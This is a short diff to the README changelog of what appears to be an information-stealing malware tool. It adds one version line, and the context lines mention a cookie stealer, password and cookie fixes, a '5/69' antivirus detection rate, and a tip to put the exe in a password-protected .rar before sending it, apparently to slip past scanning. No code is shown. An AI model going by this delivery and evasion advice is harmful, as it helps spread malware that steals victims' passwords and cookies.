@@ -87,6 +87,7 @@ Create an password protected archive (.rar) with the exe inside, then just send 
 
 ## <a id="Changelog"></a>📝・Changelog
 ```
+- V4.8.1 Added computer language support
 - V4.8 5/69 Exe detection update !
 - 4.7.2 Fixed other error related to password and cookies
 - 4.7 Fixed an cookie stealer problem
